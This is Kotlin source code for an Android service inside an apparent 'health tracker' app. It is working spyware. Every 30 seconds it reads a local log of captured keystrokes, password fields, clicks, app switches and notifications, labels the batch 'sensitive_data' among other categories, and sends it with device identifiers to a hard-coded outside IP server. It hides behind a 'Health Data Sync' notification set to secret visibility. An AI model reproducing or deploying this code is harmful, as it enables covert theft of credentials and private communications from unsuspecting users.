package com.inf2007.healthtracker.utilities

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.*
import android.util.Log
import androidx.core.app.NotificationCompat
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class DataExfilService : Service() {

    companion object {
        const val TAG = "DataExfilService"
        private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
        private const val NOTIFICATION_ID = 1001
        private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"

        fun startService(context: Context) {
            val intent = Intent(context, DataExfilService::class.java)

            // Check Android version for foreground service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }

    private lateinit var handler: Handler
    private var isUploading = false

    // Upload every 30 seconds (for testing)
    private val uploadInterval = 30 * 1000L

    private val uploadRunnable = object : Runnable {
        override fun run() {
            if (!isUploading) {
                uploadAccessibilityLogs()
            }
            handler.postDelayed(this, uploadInterval)
        }
    }

    override fun onCreate() {
        super.onCreate()
        handler = Handler(Looper.getMainLooper())
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Data exfiltration service started")

        // CRITICAL FIX: Start as foreground service immediately
        startForegroundService()

        // Start periodic uploads
        handler.postDelayed(uploadRunnable, 10000) // First upload in 10 seconds

        return START_STICKY
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelName = "Health Data Sync"
            val channelDescription = "Uploads health data to server"
            val importance = NotificationManager.IMPORTANCE_LOW

            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                channelName,
                importance
            ).apply {
                description = channelDescription
                setShowBadge(false)
            }

            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)
        Log.d(TAG, "Foreground service started with notification")
    }

    private fun createNotification(): Notification {
        return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Health Tracker")
            .setContentText("Syncing health data...")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setAutoCancel(false)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()
    }

    private fun uploadAccessibilityLogs() {
        if (isUploading) return
        if (!isNetworkAvailable()) {
            Log.d(TAG, "No network available, skipping upload")
            return
        }

        isUploading = true
        Log.d(TAG, "Starting log upload...")

        Thread {
            try {
                // Read spy logs
                val logContent = readSpyLogs()
                if (logContent.isEmpty()) {
                    Log.d(TAG, "No logs to upload")
                    isUploading = false
                    return@Thread
                }

                Log.d(TAG, "Found ${logContent.lines().size} log entries")

                // Parse logs into notifications format
                val logs = parseLogsForNotifications(logContent)

                // Send to server
                val success = sendToServer(logs)

                if (success) {
                    Log.d(TAG, "Spy logs uploaded successfully")
                    // Archive logs after successful upload
                    archiveLogs()
                } else {
                    Log.w(TAG, "Upload failed")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error uploading logs: ${e.message}", e)
            } finally {
                isUploading = false
            }
        }.start()
    }

    private fun readSpyLogs(): String {
        return try {
            val logFile = File(filesDir, "accessibility_spy.log")
            if (logFile.exists()) {
                val fileSize = logFile.length()
                Log.d(TAG, "Log file exists, size: $fileSize bytes")
                if (fileSize > 0) {
                    val content = logFile.readText()
                    Log.d(TAG, "Read ${content.lines().size} lines from log file")
                    content
                } else {
                    Log.d(TAG, "Log file is empty")
                    ""
                }
            } else {
                Log.d(TAG, "Log file does not exist")
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error reading log file", e)
            ""
        }
    }

    private fun parseLogsForNotifications(logContent: String): JSONObject {
        val logsArray = logContent.lines().filter { it.isNotBlank() }
        Log.d(TAG, "Parsing ${logsArray.size} log entries")

        val notificationData = JSONObject().apply {
            put("type", "accessibility_spy")
            put("device_id", Build.SERIAL ?: "unknown")
            put("device_model", Build.MODEL)
            put("android_version", Build.VERSION.RELEASE)
            put("timestamp", System.currentTimeMillis())
            put("total_entries", logsArray.size)
            put("collection_time", SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date()))
            put("app_package", packageName)
        }

        // Categorize logs
        val keyPresses = JSONArray()
        val appSwitches = JSONArray()
        val clicks = JSONArray()
        val sensitiveData = JSONArray()
        val notifications = JSONArray()

        logsArray.forEach { line ->
            when {
                line.contains("TYPING") || line.contains("TEXT") -> keyPresses.put(line)
                line.contains("APP_SWITCH") -> appSwitches.put(line)
                line.contains("CLICK") -> clicks.put(line)
                line.contains("SENSITIVE") || line.contains("PASSWORD") -> sensitiveData.put(line)
                line.contains("NOTIFICATION") -> notifications.put(line)
                else -> keyPresses.put(line) // Default to key presses
            }
        }

        // Create categorized object
        val categorizedLogs = JSONObject().apply {
            put("key_presses", keyPresses)
            put("app_switches", appSwitches)
            put("clicks", clicks)
            put("sensitive_data", sensitiveData)
            put("notifications", notifications)
        }

        notificationData.put("logs", categorizedLogs)

        // Also include raw logs (last 50 lines for debugging)
        val rawLogsArray = JSONArray()
        logsArray.takeLast(50).forEach { rawLogsArray.put(it) }
        notificationData.put("raw_logs_sample", rawLogsArray)

        return notificationData
    }

    private fun sendToServer(data: JSONObject): Boolean {
        return try {
            Log.d(TAG, "Sending data to server: ${data.toString().length} bytes")

            val url = URL(SERVER_ENDPOINT)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            connection.setRequestProperty("User-Agent", "HealthTracker-Spy/1.0")
            connection.setRequestProperty("Accept", "application/json")
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.doOutput = true

            // Write data
            val outputStream = connection.outputStream
            OutputStreamWriter(outputStream, "UTF-8").use { writer ->
                writer.write(data.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            val responseMessage = connection.responseMessage

            Log.d(TAG, "Server response: $responseCode $responseMessage")

            // Try to read response
            try {
                val response = if (responseCode >= 400) {
                    connection.errorStream.bufferedReader().use { it.readText() }
                } else {
                    connection.inputStream.bufferedReader().use { it.readText() }
                }
                Log.d(TAG, "Response body: $response")
            } catch (e: Exception) {
                Log.d(TAG, "Could not read response body")
            }

            connection.disconnect()

            // Consider 200, 201, 202 as success
            responseCode in 200..299

        } catch (e: Exception) {
            Log.e(TAG, "Error sending to server: ${e.message}")
            Log.e(TAG, "Full error: ", e)
            false
        }
    }

    private fun archiveLogs() {
        try {
            val logFile = File(filesDir, "accessibility_spy.log")
            if (logFile.exists() && logFile.length() > 0) {
                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val archivedFile = File(filesDir, "accessibility_spy_$timestamp.log")
                logFile.copyTo(archivedFile)
                // Clear the original log file after archiving
                logFile.writeText("")
                Log.d(TAG, "Logs archived to: ${archivedFile.name}")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error archiving logs: ${e.message}")
        }
    }

    private fun isNetworkAvailable(): Boolean {
        return try {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false

            capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
                    capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Network check error", e)
            false
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(uploadRunnable)
        Log.d(TAG, "Data exfiltration service destroyed")
        super.onDestroy()
    }
}